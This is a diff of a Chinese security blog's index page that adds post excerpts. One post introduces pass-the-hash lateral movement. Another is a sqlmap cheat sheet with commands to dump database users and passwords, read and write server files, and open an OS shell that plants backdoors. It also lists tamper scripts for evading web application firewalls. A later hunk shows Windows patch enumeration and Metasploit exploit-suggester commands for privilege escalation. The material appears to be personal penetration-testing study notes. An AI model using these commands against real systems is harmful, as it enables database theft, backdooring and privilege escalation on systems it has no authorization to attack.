@@ -134,6 +134,52 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/04/20/内网横向（二）/" >域内横向（二）</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-04-20  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="域内横向（二）"><a href="#域内横向（二）" class="headerlink" title="域内横向（二）"></a>域内横向（二）</h1><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><h3 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h3><p>在域环境中，用户登录计算机时使用的大都是域账号，在管理员大量安装域内计算机时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员的账号和密码都是相同的，攻击者就能使用哈希传递攻击的方法登录内网中的计算机</p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>因为Windows Vista和2008开始，Windows操作系统默认禁用了LM Hash，因为在使用NTLM Hash进行身份认证时，不会使用明文口令，而是将明文口令通过系统API转换成散列值。攻击者在获取散列值之后可以直接使用散列值进行传递攻击</p>
+<h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>要想实现哈希传递，必须具有本地管理员权限</p>
+<h3 id="传递攻击实现"><a href="#传递攻击实现" class="headerlink" title="传递攻击实现"></a>传递攻击实现</h3><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4>
+	
+
+	</div>
+  <a type="button" href="/2021/04/20/内网横向（二）/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="域内横向（二）"><a href="#域内横向（二）" class="headerlink" title="域内横向（二）"></a>域内横向（二）</h1><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><h3 id="产生"><a href="#产生" class="headerlink" title="产生"></a>产生</h3><p>在域环境中，用户登录计算机时使用的大都是域账号，在管理员大量安装域内计算机时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员的账号和密码都是相同的，攻击者就能使用哈希传递攻击的方法登录内网中的计算机</p>
+<h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>因为Windows Vista和2008开始，Windows操作系统默认禁用了LM Hash，因为在使用NTLM Hash进行身份认证时，不会使用明文口令，而是将明文口令通过系统API转换成散列值。攻击者在获取散列值之后可以直接使用散列值进行传递攻击</p>
+<h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>要想实现哈希传递，必须具有本地管理员权限</p>
+<h3 id="传递攻击实现"><a href="#传递攻击实现" class="headerlink" title="传递攻击实现"></a>传递攻击实现</h3><h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4>
+	
+	</div>
+  <a type="button" href="/2021/04/20/内网横向（二）/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/04/20/JS的那些事/" >JS那些事</a>
 		</h3>
 		</div>
@@ -175,6 +221,66 @@
 	
 	</div>
   <a type="button" href="/2021/04/20/JS的那些事/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2021/04/20/SQLMAP工具命令/" >SQLMAP工具命令</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-04-20  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="SQLMAP工具命令"><a href="#SQLMAP工具命令" class="headerlink" title="SQLMAP工具命令"></a>SQLMAP工具命令</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><p>读取数据库—&gt;读取表—-&gt;读取表的列—-&gt;获取内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py –update <span class="comment">#更新sqlmap</span></span><br><span class="line">sqlmap.py -h <span class="comment">#查看帮助</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.0.158:8006/showproducts.php?id=13&quot;</span> <span class="comment">#这里的-u参数就是注入点</span></span><br><span class="line">sqlmap.py -r 1.txt	<span class="comment">#导入请求包文件</span></span><br><span class="line">sqlmap.py -m 1.txt	<span class="comment">#从文本中读取url,逐行进行测试</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.0.240:8006/showproducts.php?id=13&quot;</span> <span class="comment">#–is-dba #当前用户权限 返回True的话为管理员</span></span><br><span class="line">sqlmap.py -g <span class="string">&quot;inurl:php?id=&quot;</span>	<span class="comment">#使用google边搜边打</span></span><br><span class="line">–dbs <span class="comment">#列出所有数据库</span></span><br><span class="line">–current-db <span class="comment">#网站当前数据库</span></span><br><span class="line">–users <span class="comment">#查看数据库链接用户 %号分隔的话，是个公网ip 就可以随意访问</span></span><br><span class="line">–current-user <span class="comment">#当前数据库用户</span></span><br><span class="line">–passwords <span class="comment">#列出用户密码</span></span><br><span class="line">–tables -D xycms <span class="comment">#查表 -D 相当于 -database 相当于数据库</span></span><br><span class="line">–tables -D xycms –count <span class="comment">#多加的参数相当于统计一下，表里面的行数</span></span><br><span class="line">–columns -T manage_user -D xycms <span class="comment">#列字段，-T 表名 -D 数据库名</span></span><br><span class="line">–dump -C m_name,m_pwd -T manage_user -D xycms <span class="comment">#下载数据 -C 列名 逗号分隔</span></span><br><span class="line">–dump-all <span class="comment">#转存DBMS数据库所有表项目</span></span><br><span class="line">–level <span class="comment">#测试等级(1-5)，默认为1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">-D <span class="comment">#指定数据库</span></span><br><span class="line">-T <span class="comment">#指定表</span></span><br><span class="line">-C <span class="comment">#指定列</span></span><br><span class="line">–dbms=mysql <span class="comment">#指定数据库为mysql，也可以是 oracle mssql</span></span><br><span class="line"><span class="comment">#以下四个需要管理员权限：</span></span><br><span class="line">-users <span class="comment">#枚举所有用户</span></span><br><span class="line">-passwords <span class="comment">#枚举所有用户密码</span></span><br><span class="line">-roles <span class="comment">#列出数据库管理员角色</span></span><br><span class="line">-privileges <span class="comment">#列出数据库管理员权限</span></span><br><span class="line"></span><br><span class="line">-level	<span class="comment">#越高越好；建议3以上</span></span><br><span class="line">-risk		<span class="comment">#风险等级；建议3以上；配合level一起使用</span></span><br><span class="line"></span><br><span class="line">-date		<span class="comment">#post请求参数</span></span><br><span class="line">-headers	<span class="comment">#增加额外的http头</span></span><br><span class="line">-proxy	<span class="comment">#设置代理</span></span><br><span class="line">-delay	<span class="comment">#设置延迟</span></span><br><span class="line">-p			<span class="comment">#设置需要测试的参数</span></span><br><span class="line">--prefix, --suffix	<span class="comment">#告诉sqlmap如何闭合；prefix闭合前面语句；suffix闭合后面语句</span></span><br><span class="line">--batch	<span class="comment">#省去sqlmap交互询问</span></span><br><span class="line">--random-agent			<span class="comment">#使用随机代理</span></span><br><span class="line"></span><br><span class="line">--technique		<span class="comment">#指定探测方式</span></span><br><span class="line">B: Boolean-based blind SQL injection	<span class="comment">#（布尔型注入）</span></span><br><span class="line">E: Error-based SQL injection	<span class="comment">#（报错型注入）</span></span><br><span class="line">U: UNION query SQL injection	<span class="comment">#（可联合查询注入）</span></span><br><span class="line">S: Stacked queries SQL injection	<span class="comment">#（可多语句查询注入）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#文件读写-----适用于MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数</span></span><br><span class="line">-file-read		<span class="comment">#读文件</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.2.129/article?lang=cn&amp;id=22&quot;</span> –file-read=<span class="string">&quot;C:\Inetpub\wwwroot\mysql-php\1.php&quot;</span></span><br><span class="line">--file-write, --file-dest	<span class="comment">#写文件</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.2.129/article.php?id=5&quot;</span> --file-write=<span class="string">&quot;C:\1.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/x.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#命令执行-----当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。</span></span><br><span class="line">-os-cmd				<span class="comment">#执行cmd命令（win）</span></span><br><span class="line">-os-shell			<span class="comment">#执行当前用户命令，会传两个后门，一个任意文件上传，一个脚本后门</span></span><br><span class="line">-sql-shell		<span class="comment">#进入sql语句</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">--identify-waf	<span class="comment">#对一些网站是否有安全防护进行试探</span></span><br><span class="line"></span><br><span class="line">--tamper apostrophemask.py	<span class="comment">#过滤单引号</span></span><br><span class="line">--tamper apostrophenullencode.py	<span class="comment">#用双unicode替换&#x27;（例如&#x27;-&gt;％00％27）</span></span><br><span class="line">--tamper base64encode.py		<span class="comment">#base64编码</span></span><br><span class="line">--tamper multiplespaces.py	<span class="comment">#围绕sql关键字添加多个空格</span></span><br><span class="line">--tamper space2plus.py			<span class="comment">#用加号替换空格</span></span><br><span class="line">--tamper nonrecursivereplacement.py	<span class="comment">#作为双重查询语句 SELECT -&gt; SELESELECTCT</span></span><br><span class="line">--tamper space2randomblank.py		<span class="comment">#将空格替换为其他有效字符</span></span><br><span class="line">--tamper unionalltounion.py <span class="comment">#将union allselect 替换为unionselect</span></span><br><span class="line">--tamper securesphere.py		<span class="comment">#追加特定的字符串</span></span><br><span class="line">--tamper space2dash.py			<span class="comment">#将空格替换为--，并添加一个随机字符串和换行符</span></span><br><span class="line">--tamper between.py					<span class="comment">#用运算符（&#x27;&gt;&#x27;）替换&#x27;NOT BETWEEN 0 AND＃&#x27;，用运算符（&#x27;=&#x27;）替换&#x27;BETWEEN＃AND＃&#x27;</span></span><br><span class="line">--tamper bluecoat.py				<span class="comment">#用随机空白字符替换语句后的空格字符，之后用运算符LIKE替换字符&#x27;=&#x27;</span></span><br><span class="line">--tamper chardoubleencode.py		<span class="comment">#对payload中的所有字符进行双重URL编码</span></span><br><span class="line">--tamper charencode.py			<span class="comment">#对payload中所有字符进行URL编码</span></span><br><span class="line">--tamper charunicodeencode.py		<span class="comment">#对payload中的所有字符进行unicode编码</span></span><br><span class="line">--tamper commentbeforeparentheses.py		<span class="comment">#在括号前加（内联）注释（例如（（-&gt;/**/（）</span></span><br><span class="line">--tamper equaltolike.py 		<span class="comment">#将（&#x27;=&#x27;）运算符替换为&#x27;LIKE&#x27;</span></span><br><span class="line">--tamper escapequotes.py		<span class="comment">#斜杠转义单引号和双引号（例如&#x27;-&gt; \&#x27;）</span></span><br><span class="line">--tamper great.py						<span class="comment">#替换运算符（&#x27;&gt;&#x27; ）和&#x27;GREATEST&#x27;对应</span></span><br><span class="line">--tamper ifnull2casewhenisnull.py	<span class="comment">#绕过对 IFNULL 过滤,替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</span></span><br><span class="line">--tamper ifnull2ifisnull.py	<span class="comment">#用&#x27;IF（ISNULL（A），B）替换&#x27;IFNULL（A，B）&#x27;之类的实例</span></span><br><span class="line">--tamper least.py						<span class="comment">#用&#x27;LEAST&#x27;对应替换运算符（&#x27;&gt;&#x27;）</span></span><br><span class="line">--tamper lowercase.py 			<span class="comment">#用小写替换每个关键字字符</span></span><br><span class="line">--tamper luanginx.py				<span class="comment">#LUA-NginxWAF绕过（例如Cloudflare）</span></span><br><span class="line">--tamper symbolicologic.py	<span class="comment">#用符号（&amp;&amp;和||）替换AND和OR逻辑运算符</span></span><br><span class="line">--tamper uppercase.py				<span class="comment">#用大写值替换每个关键字字符</span></span><br><span class="line">--tamper varnish.py					<span class="comment">#添加HTTP标头&#x27;X-originating-IP&#x27;以绕过Varnish防火墙</span></span><br><span class="line">--tamper versionedkeywords.py			<span class="comment">#用注释封装每个非函数的关键字</span></span><br><span class="line">--tamper xforwardedfor.py		<span class="comment">#添加伪造的HTTP标头&#x27;X-Forwarded-For</span></span><br><span class="line">...[skip]...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="增加几个链接用于不时之需"><a href="#增加几个链接用于不时之需" class="headerlink" title="增加几个链接用于不时之需"></a>增加几个链接用于不时之需</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4587690/blog/4451822">tamper1</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2746">tamper2</a></li>
+</ul>
+	
+
+	</div>
+  <a type="button" href="/2021/04/20/SQLMAP工具命令/#more" class="btn btn-default more">阅读此文</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h1 id="SQLMAP工具命令"><a href="#SQLMAP工具命令" class="headerlink" title="SQLMAP工具命令"></a>SQLMAP工具命令</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><p>读取数据库—&gt;读取表—-&gt;读取表的列—-&gt;获取内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py –update <span class="comment">#更新sqlmap</span></span><br><span class="line">sqlmap.py -h <span class="comment">#查看帮助</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.0.158:8006/showproducts.php?id=13&quot;</span> <span class="comment">#这里的-u参数就是注入点</span></span><br><span class="line">sqlmap.py -r 1.txt	<span class="comment">#导入请求包文件</span></span><br><span class="line">sqlmap.py -m 1.txt	<span class="comment">#从文本中读取url,逐行进行测试</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.0.240:8006/showproducts.php?id=13&quot;</span> <span class="comment">#–is-dba #当前用户权限 返回True的话为管理员</span></span><br><span class="line">sqlmap.py -g <span class="string">&quot;inurl:php?id=&quot;</span>	<span class="comment">#使用google边搜边打</span></span><br><span class="line">–dbs <span class="comment">#列出所有数据库</span></span><br><span class="line">–current-db <span class="comment">#网站当前数据库</span></span><br><span class="line">–users <span class="comment">#查看数据库链接用户 %号分隔的话，是个公网ip 就可以随意访问</span></span><br><span class="line">–current-user <span class="comment">#当前数据库用户</span></span><br><span class="line">–passwords <span class="comment">#列出用户密码</span></span><br><span class="line">–tables -D xycms <span class="comment">#查表 -D 相当于 -database 相当于数据库</span></span><br><span class="line">–tables -D xycms –count <span class="comment">#多加的参数相当于统计一下，表里面的行数</span></span><br><span class="line">–columns -T manage_user -D xycms <span class="comment">#列字段，-T 表名 -D 数据库名</span></span><br><span class="line">–dump -C m_name,m_pwd -T manage_user -D xycms <span class="comment">#下载数据 -C 列名 逗号分隔</span></span><br><span class="line">–dump-all <span class="comment">#转存DBMS数据库所有表项目</span></span><br><span class="line">–level <span class="comment">#测试等级(1-5)，默认为1</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">-D <span class="comment">#指定数据库</span></span><br><span class="line">-T <span class="comment">#指定表</span></span><br><span class="line">-C <span class="comment">#指定列</span></span><br><span class="line">–dbms=mysql <span class="comment">#指定数据库为mysql，也可以是 oracle mssql</span></span><br><span class="line"><span class="comment">#以下四个需要管理员权限：</span></span><br><span class="line">-users <span class="comment">#枚举所有用户</span></span><br><span class="line">-passwords <span class="comment">#枚举所有用户密码</span></span><br><span class="line">-roles <span class="comment">#列出数据库管理员角色</span></span><br><span class="line">-privileges <span class="comment">#列出数据库管理员权限</span></span><br><span class="line"></span><br><span class="line">-level	<span class="comment">#越高越好；建议3以上</span></span><br><span class="line">-risk		<span class="comment">#风险等级；建议3以上；配合level一起使用</span></span><br><span class="line"></span><br><span class="line">-date		<span class="comment">#post请求参数</span></span><br><span class="line">-headers	<span class="comment">#增加额外的http头</span></span><br><span class="line">-proxy	<span class="comment">#设置代理</span></span><br><span class="line">-delay	<span class="comment">#设置延迟</span></span><br><span class="line">-p			<span class="comment">#设置需要测试的参数</span></span><br><span class="line">--prefix, --suffix	<span class="comment">#告诉sqlmap如何闭合；prefix闭合前面语句；suffix闭合后面语句</span></span><br><span class="line">--batch	<span class="comment">#省去sqlmap交互询问</span></span><br><span class="line">--random-agent			<span class="comment">#使用随机代理</span></span><br><span class="line"></span><br><span class="line">--technique		<span class="comment">#指定探测方式</span></span><br><span class="line">B: Boolean-based blind SQL injection	<span class="comment">#（布尔型注入）</span></span><br><span class="line">E: Error-based SQL injection	<span class="comment">#（报错型注入）</span></span><br><span class="line">U: UNION query SQL injection	<span class="comment">#（可联合查询注入）</span></span><br><span class="line">S: Stacked queries SQL injection	<span class="comment">#（可多语句查询注入）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#文件读写-----适用于MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数</span></span><br><span class="line">-file-read		<span class="comment">#读文件</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.2.129/article?lang=cn&amp;id=22&quot;</span> –file-read=<span class="string">&quot;C:\Inetpub\wwwroot\mysql-php\1.php&quot;</span></span><br><span class="line">--file-write, --file-dest	<span class="comment">#写文件</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.2.129/article.php?id=5&quot;</span> --file-write=<span class="string">&quot;C:\1.php&quot;</span> --file-dest=<span class="string">&quot;/var/www/html/x.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#命令执行-----当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数。</span></span><br><span class="line">-os-cmd				<span class="comment">#执行cmd命令（win）</span></span><br><span class="line">-os-shell			<span class="comment">#执行当前用户命令，会传两个后门，一个任意文件上传，一个脚本后门</span></span><br><span class="line">-sql-shell		<span class="comment">#进入sql语句</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">--identify-waf	<span class="comment">#对一些网站是否有安全防护进行试探</span></span><br><span class="line"></span><br><span class="line">--tamper apostrophemask.py	<span class="comment">#过滤单引号</span></span><br><span class="line">--tamper apostrophenullencode.py	<span class="comment">#用双unicode替换&#x27;（例如&#x27;-&gt;％00％27）</span></span><br><span class="line">--tamper base64encode.py		<span class="comment">#base64编码</span></span><br><span class="line">--tamper multiplespaces.py	<span class="comment">#围绕sql关键字添加多个空格</span></span><br><span class="line">--tamper space2plus.py			<span class="comment">#用加号替换空格</span></span><br><span class="line">--tamper nonrecursivereplacement.py	<span class="comment">#作为双重查询语句 SELECT -&gt; SELESELECTCT</span></span><br><span class="line">--tamper space2randomblank.py		<span class="comment">#将空格替换为其他有效字符</span></span><br><span class="line">--tamper unionalltounion.py <span class="comment">#将union allselect 替换为unionselect</span></span><br><span class="line">--tamper securesphere.py		<span class="comment">#追加特定的字符串</span></span><br><span class="line">--tamper space2dash.py			<span class="comment">#将空格替换为--，并添加一个随机字符串和换行符</span></span><br><span class="line">--tamper between.py					<span class="comment">#用运算符（&#x27;&gt;&#x27;）替换&#x27;NOT BETWEEN 0 AND＃&#x27;，用运算符（&#x27;=&#x27;）替换&#x27;BETWEEN＃AND＃&#x27;</span></span><br><span class="line">--tamper bluecoat.py				<span class="comment">#用随机空白字符替换语句后的空格字符，之后用运算符LIKE替换字符&#x27;=&#x27;</span></span><br><span class="line">--tamper chardoubleencode.py		<span class="comment">#对payload中的所有字符进行双重URL编码</span></span><br><span class="line">--tamper charencode.py			<span class="comment">#对payload中所有字符进行URL编码</span></span><br><span class="line">--tamper charunicodeencode.py		<span class="comment">#对payload中的所有字符进行unicode编码</span></span><br><span class="line">--tamper commentbeforeparentheses.py		<span class="comment">#在括号前加（内联）注释（例如（（-&gt;/**/（）</span></span><br><span class="line">--tamper equaltolike.py 		<span class="comment">#将（&#x27;=&#x27;）运算符替换为&#x27;LIKE&#x27;</span></span><br><span class="line">--tamper escapequotes.py		<span class="comment">#斜杠转义单引号和双引号（例如&#x27;-&gt; \&#x27;）</span></span><br><span class="line">--tamper great.py						<span class="comment">#替换运算符（&#x27;&gt;&#x27; ）和&#x27;GREATEST&#x27;对应</span></span><br><span class="line">--tamper ifnull2casewhenisnull.py	<span class="comment">#绕过对 IFNULL 过滤,替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</span></span><br><span class="line">--tamper ifnull2ifisnull.py	<span class="comment">#用&#x27;IF（ISNULL（A），B）替换&#x27;IFNULL（A，B）&#x27;之类的实例</span></span><br><span class="line">--tamper least.py						<span class="comment">#用&#x27;LEAST&#x27;对应替换运算符（&#x27;&gt;&#x27;）</span></span><br><span class="line">--tamper lowercase.py 			<span class="comment">#用小写替换每个关键字字符</span></span><br><span class="line">--tamper luanginx.py				<span class="comment">#LUA-NginxWAF绕过（例如Cloudflare）</span></span><br><span class="line">--tamper symbolicologic.py	<span class="comment">#用符号（&amp;&amp;和||）替换AND和OR逻辑运算符</span></span><br><span class="line">--tamper uppercase.py				<span class="comment">#用大写值替换每个关键字字符</span></span><br><span class="line">--tamper varnish.py					<span class="comment">#添加HTTP标头&#x27;X-originating-IP&#x27;以绕过Varnish防火墙</span></span><br><span class="line">--tamper versionedkeywords.py			<span class="comment">#用注释封装每个非函数的关键字</span></span><br><span class="line">--tamper xforwardedfor.py		<span class="comment">#添加伪造的HTTP标头&#x27;X-Forwarded-For</span></span><br><span class="line">...[skip]...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="增加几个链接用于不时之需"><a href="#增加几个链接用于不时之需" class="headerlink" title="增加几个链接用于不时之需"></a>增加几个链接用于不时之需</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4587690/blog/4451822">tamper1</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2746">tamper2</a></li>
+</ul>
+	
+	</div>
+  <a type="button" href="/2021/04/20/SQLMAP工具命令/#more" class="btn btn-default more">阅读此文</a>
 </div>
 
 		
@@ -451,7 +557,7 @@
 <h2 id="系统内核溢出提权"><a href="#系统内核溢出提权" class="headerlink" title="系统内核溢出提权"></a>系统内核溢出提权</h2><ul>
 <li> 发现系统缺失补丁</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">发现系统缺失补丁</span><br><span class="line">groups			#查看当前权限</span><br><span class="line">systeminfo					#列出补丁编号</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn			#使用wmic列出已上补丁</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MSF</span><br><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches		#寻找缺失补丁</span><br><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester		#找出系统中可能被利用的漏洞</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">发现系统缺失补丁</span><br><span class="line">groups			<span class="comment">#查看当前权限</span></span><br><span class="line">systeminfo					<span class="comment">#列出补丁编号</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn			<span class="comment">#使用wmic列出已上补丁</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MSF</span><br><span class="line">use post/windows/gather/enum_patches		<span class="comment">#寻找缺失补丁</span></span><br><span class="line">use post/multi/recon/local_exploit_suggester		<span class="comment">#找出系统中可能被利用的漏洞</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>将列出的补丁编号与exp库进行对比，使用不在补丁编号的exp进行提权</li>
@@ -473,7 +579,7 @@
 <h2 id="系统内核溢出提权"><a href="#系统内核溢出提权" class="headerlink" title="系统内核溢出提权"></a>系统内核溢出提权</h2><ul>
 <li> 发现系统缺失补丁</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">发现系统缺失补丁</span><br><span class="line">groups			#查看当前权限</span><br><span class="line">systeminfo					#列出补丁编号</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn			#使用wmic列出已上补丁</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MSF</span><br><span class="line">use post&#x2F;windows&#x2F;gather&#x2F;enum_patches		#寻找缺失补丁</span><br><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester		#找出系统中可能被利用的漏洞</span><br></pre></td></tr></table></figure>
